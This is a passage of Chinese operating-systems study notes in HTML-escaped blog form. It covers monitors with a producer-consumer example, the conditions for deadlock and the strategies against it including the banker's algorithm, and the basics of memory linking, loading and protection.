punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 拿左&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mutex&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        吃饭&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;chopstick&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;chopstick&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        思考&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1234567891011121314&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;23_11-管程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23_11-管程&#34;&gt;#&lt;/a&gt; 2.3_11 管程&lt;/h3&gt;
&lt;p&gt;1、为什么要引入管程&lt;/p&gt;
&lt;p&gt;PV 操作容易出错、困难&lt;/p&gt;
&lt;p&gt;2、管程的定义和基本特征&lt;/p&gt;
&lt;p&gt;定义：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;局部于管程的共享数据结构说明&lt;/li&gt;
&lt;li&gt;对该数据结构进程操作的一组过程&lt;/li&gt;
&lt;li&gt;对局部于管程的共享数据设置初始值的语句&lt;/li&gt;
&lt;li&gt;管程有一个名字&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;基本特征：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;局部于管程数据结构只能被局部于管程的过程所访问&lt;/li&gt;
&lt;li&gt;一个进程只有通过调用管程内的过程才能进入管程访问共享数据&lt;/li&gt;
&lt;li&gt;每次仅允许一个进程在管程内执行某个内部过程&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;心得：相当于 C++ 的类，管程是数据放在 private 中，函数放在 public 中&lt;/p&gt;
&lt;p&gt;拓展 1：用管程解决生产者消费者问题&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;monitor producerconsumer&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    condition full&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;empty&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; count &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;insert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Item item&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;count &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; N&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token function&#34;&gt;wait&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;full&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        count&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;insert_item&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;item&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;count &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token function&#34;&gt;signal&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;empty&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    Item &lt;span class=&#34;token function&#34;&gt;remove&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;count &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token function&#34;&gt;wait&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;empty&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        count&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;count &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; N&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token function&#34;&gt;signal&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;full&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;remove_item&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    end monitor&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 使用&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;producer&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        item &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; 生产一个产品&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        producerconsumer&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;insert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;item&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;consumer&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        item &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; producerconsumer&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;remove&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        消费产品 item&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1234567891011121314151617181920212223242526272829303132333435&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;拓展 2：Java 中类似于管程的机制&lt;/p&gt;
&lt;p&gt;java 中用 synchronized 来描述一个函数，这个函数同一时间只能被一个线程调用&lt;/p&gt;
&lt;h3 id=&#34;24_1-死锁的概念&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#24_1-死锁的概念&#34;&gt;#&lt;/a&gt; 2.4_1 死锁的概念&lt;/h3&gt;
&lt;p&gt;1、什么是死锁&lt;/p&gt;
&lt;p&gt;各进程互相等待对方手里的资源，导致各进程都阻塞，无法向前推进的现象。&lt;/p&gt;
&lt;p&gt;2、进程死锁、饥饿、死循环的区别&lt;/p&gt;
&lt;p&gt;死锁：&lt;/p&gt;
&lt;p&gt;定义：各进程互相等待对方手里的资源，导致各进程都阻塞，无法向前推进的现象。&lt;/p&gt;
&lt;p&gt;区别：至少两个或两个的进程同时发生死锁&lt;/p&gt;
&lt;p&gt;饥饿：&lt;/p&gt;
&lt;p&gt;定义：由于长期得不到想要的资源，某进程无法向前推进的现象。&lt;/p&gt;
&lt;p&gt;区别：可能只有一个进程发生饥饿&lt;/p&gt;
&lt;p&gt;死循环：&lt;/p&gt;
&lt;p&gt;定义：某进程执行过程中一直跳不出某个循环的现象。&lt;/p&gt;
&lt;p&gt;区别：死循环是程序员的问题&lt;/p&gt;
&lt;p&gt;3、死锁产生的必要条件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;互斥条件：多个进程争夺资源发生死锁&lt;/li&gt;
&lt;li&gt;不剥夺条件：进程获得的资源不能由其它进程强行抢夺&lt;/li&gt;
&lt;li&gt;请求和保持条件：某个进程有了资源，还在请求资源&lt;/li&gt;
&lt;li&gt;循环等待条件：存在资源的循环等待链&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;4、什么时候会发生死锁&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对系统资源的竞争&lt;/li&gt;
&lt;li&gt;进程推进顺序非法&lt;/li&gt;
&lt;li&gt;信号量的使用不当也会造成死锁&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;5、死锁的处理策略&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;预防死锁&lt;/li&gt;
&lt;li&gt;避免死锁&lt;/li&gt;
&lt;li&gt;死锁的检测和解除&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;24_2-死锁的处理策略预防死锁&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#24_2-死锁的处理策略预防死锁&#34;&gt;#&lt;/a&gt; 2.4_2 死锁的处理策略 —— 预防死锁&lt;/h3&gt;
&lt;p&gt;1、不允许死锁发生&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;静态策略：预防死锁
&lt;ul&gt;
&lt;li&gt;破坏互斥条件（有些不能破坏）&lt;br&gt;
把互斥的资源改造为共享资源&lt;/li&gt;
&lt;li&gt;破坏不剥夺条件（复杂，造成之前工作失效，降低系统开销，会全部放弃、导致饥饿）&lt;br&gt;
方案 1：当请求得不到满足的时候，立即释放手里的资源&lt;br&gt;
方案 2：由系统介入，强行帮助剥夺&lt;/li&gt;
&lt;li&gt;破坏请求和保持条件（资源利用率极低，可能会导致某些进程饥饿）&lt;br&gt;
采用静态分配方法，一次性全部申请，如果申请不到，不要允许&lt;/li&gt;
&lt;li&gt;破坏循环等待条件（不方便增加新的设备，实际使用与递增顺序不一致，会导致资源的浪费，必须按规定次序申请资源）&lt;br&gt;
顺序资源分配法：对资源编号，进程按编号递增顺序请求资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;动态检测：避免死锁&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2、允许死锁发生&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;死锁的检测和解除&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;24_3-死锁的处理策略避免死锁&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#24_3-死锁的处理策略避免死锁&#34;&gt;#&lt;/a&gt; 2.4_3 死锁的处理策略 —— 避免死锁&lt;/h3&gt;
&lt;p&gt;动态检测：避免死锁&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;什么是安全序列&lt;/p&gt;
&lt;p&gt;进行后面的某些情况，不会使系统发生死锁&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;什么是系统的不安全状态，与死锁有何联系&lt;br&gt;
如果系统处于安全状态，就一定不会发生死锁。如果系统进入不安全状态，就可能发生死锁（处于不安全状态未必就是发生了死锁，但发生死锁时一定时在不安全状态）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如何避免系统进入不安全状态 —— 银行家算法&lt;/p&gt;
&lt;p&gt;初始分配完成后，优先全部分配给最少的，并且拿回资源&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;步骤：&lt;/p&gt;
&lt;p&gt;1、检查此次申请是否超过了之前声明的最大需求数&lt;/p&gt;
&lt;p&gt;2、检查此时系统剩余的可用资源是否还能满足这次请求&lt;/p&gt;
&lt;p&gt;3、试探着分配，更改各数据结构&lt;/p&gt;
&lt;p&gt;4、用安全性算法检查此次所分配是否会导致系统进入不安全状态&lt;/p&gt;
&lt;h3 id=&#34;24_4-死锁的处理策略检测和解除&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#24_4-死锁的处理策略检测和解除&#34;&gt;#&lt;/a&gt; 2.4_4 死锁的处理策略 —— 检测和解除&lt;/h3&gt;
&lt;p&gt;死锁的检测&lt;/p&gt;
&lt;p&gt;1、用某种数据结构来保存资源的请求和分配信息&lt;/p&gt;
&lt;p&gt;2、提供一种算法，利用上述信息来检测系统是否已进入死锁状态&lt;/p&gt;
&lt;p&gt;死锁的解除&lt;/p&gt;
&lt;p&gt;1、资源剥夺法：挂起某些死锁进程，并抢占它的资源，将这些资源分配给其他的死锁进程。&lt;/p&gt;
&lt;p&gt;2、撤销进程法：强制撤销部分，甚至全部死锁进程，并剥夺这些进程的资源。&lt;/p&gt;
&lt;p&gt;3、进程回退法：让一个或多个死锁进程回退到足以避免死锁的地步。&lt;/p&gt;
&lt;h3 id=&#34;31_1-内存的基础知识&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31_1-内存的基础知识&#34;&gt;#&lt;/a&gt; 3.1_1 内存的基础知识&lt;/h3&gt;
&lt;p&gt;主存储器：简称主存或内存，主要用于保存进程运行时的程序和数据&lt;/p&gt;
&lt;p&gt;寄存器：是 CPU 内部的一些小型存储区域，用于暂时存放参与运算的指令、数据和运算结果等内容&lt;/p&gt;
&lt;p&gt;高速缓存：是介于寄存器和内存之间的存储器，主要用于备份内存中较常用的数据，以减少处理机对内存的访问次数。&lt;/p&gt;
&lt;p&gt;磁盘缓存：主要用于暂时存放频繁使用的一部分磁盘数据，以减少访问磁盘的次数。&lt;/p&gt;
&lt;p&gt;CPU 生成的地址通常称为逻辑地址或相对地址，而内存单元 (即装入内存地址寄存器的地址) 看到的地址通常称为物理地址或绝对地址&lt;/p&gt;
&lt;p&gt;相对地址：相对于进程的起始地址而言的地址 1&lt;/p&gt;
&lt;p&gt;从写程序到程序运行：编辑 - 编译 - 链接 - 装入&lt;/p&gt;
&lt;p&gt;三种链接方式：静态链接（在程序运行前，先将各目标模块及它们所需的库函数连接成一个完整的可执行文件）、装入时动态链接（将各目标模块装入内存时，边装入边链接的链接方式）、运行时动态链接（在程序执行中需要该模块时，才对它进行链接，其优点是便于修改和更新。）&lt;/p&gt;
&lt;p&gt;三种装入方式：绝对装入（在编译的时候就知道程序放在内存的哪个位置）、可重定位装入方式（装入时将逻辑地址转表为物理地址）、动态运行时装入方式（把地址转化推迟到程序真正要执行时才进行）&lt;/p&gt;
&lt;p&gt;绝对装入：在编译时，如果知道程序将放到内存中的哪个位置，编译程序将产生绝对地址的目标代&lt;br&gt;
装入程序按照装入模块中的地址，将程序和数据装入内存。&lt;/p&gt;
&lt;p&gt;可重定位装入方式：编译、链接后的装入模块的地址都是从 0 开始的，指令中使用的地&lt;br&gt;
址、数据存放的地址都是相对于起始地址而言的逻辑地址。可根据内存的当前情况，将装入模块装入&lt;br&gt;
到内存的适当位置。装入时对地址进行 “重定位”，将逻辑地址变换为物理地址（地址变换是在装入时一次完成的)&lt;/p&gt;
&lt;p&gt;可重定位装入方式的特点是在一个作业装入内存时，必须分配其要求的全部内存空间，如果没有足够的内存，就不能装入该作业。作业一旦进入内存后，在运行期间就不能再移动，也不能再申请内存空间。&lt;/p&gt;
&lt;p&gt;动态重定位：又称动态运行时装入。编译、链接后的装入模块的地址都是从 0 开始的。装入程序把装入模块装入内存后，并不会立即把逻辑地址转换为物理地址，而是把地址转换推迟到程序真正要执行&lt;br&gt;
时才进行。因此装入内存后所有的地址依然是逻辑地址。这种方式需要一个重定位寄存器的支持。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230728154546336.png&#34; alt=&#34;image-20230728154546336&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;内存保护&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#内存保护&#34;&gt;#&lt;/a&gt; 内存保护&lt;/h2&gt;
&lt;p&gt;系统通过两个寄存器实现这种保护：基地址寄存器和界限寄存器&lt;/p&gt;
&lt;p&gt;基地址寄存器保存最小的合法物理内存地址&lt;/p&gt;
&lt;p&gt;界限寄存器制定了合法的范围大小 (界限地址)&lt;/p&gt;
